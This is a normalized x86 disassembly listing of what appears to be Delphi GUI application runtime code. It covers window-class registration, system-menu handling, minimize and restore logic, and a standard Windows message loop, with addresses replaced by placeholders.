call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c808
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45a73c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c830
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408700
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404158
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45aeb8
mov eax ebx
call sub_45b87c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_459174
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_459055
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_45b88c
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45a544
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45a73c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45b0d8
xor edx edx
mov eax esi
call sub_45aa54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a9c
push esi
push sub_4595a8
mov eax esi
call sub_45a330
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405634
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403198
mov eax [ esi + 0x90 ]
call sub_403198
mov eax [ esi + 0x98 ]
call sub_403198
test bl bl
jle r-xdata
call sub_41ab78
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_459174
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_459315
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45931c
lea eax [ ebp - 0x2c ]
call sub_403ee8
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_4596f4
call sub_41aae0
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4043a8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406a80
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403ee8
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_459df8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_459df8
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_459324
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_457fc8
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_459384
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413eec
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_440d58
cmp ebx eax
je r-xdata
sub_4593f4
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_459384
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_414098
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45950c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_414098
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4595a8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cad0
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_458564
mov eax [ rw-data ]
call sub_458bac
sub_459600
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45965d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459664
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4040e0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45966c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4596a8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_459df8
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_4596f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403638#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4595a8
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45a814
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_414098
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_440d58
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45b740
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45a330
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45a2d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_440d58
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_459df8
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_458bac
push ebp
call sub_45966c
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45966c
pop ecx
jmp [ eax * 4 + jump_table_459798 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_440d58
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45a1ac
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_445660
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459600
push ebp
call sub_45966c
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45966c
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45966c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_4198b0
jmp r-xdata
xor eax eax
call sub_45149c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_440d58
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43b724
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_459e14
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45966c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_456d1c
jmp r-xdata
push ebp
call sub_45966c
pop ecx
jmp r-xdata
push ebp
call sub_4596a8
pop ecx
jmp r-xdata
push ebp
call sub_45966c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45950c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_459ec4
jmp r-xdata
jmp r-xdata
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4594fc
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45950c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_459504
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45134c
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45966c
pop ecx
jmp r-xdata
call sub_451400
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45966c
pop ecx
jmp r-xdata
call sub_42f57c
call sub_42f6b8
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d478
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_459e14
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4594fc
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_458e2c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_440d58
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_440d58
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_459ec4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_458e2c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_440d58
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45950c
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_440d58
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_454aa8
mov eax [ ebx + 0x44 ]
call sub_456ec4
sub_459fc4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45a000
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f3c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403fd8
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45a04c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45a070
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45a0c0
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_4373fc
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_440d58
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45a178
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45b0d8
sub_45a1ac
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_440d58
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403394
test al al
jne r-xdata
sub_45a218
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45a178
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45a070
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45a0c0
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45a04c
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45a2b0
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45a218
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45ab80
sub_45a2d4
push ebp
mov ebp esp
push ebx
mov ebx eax
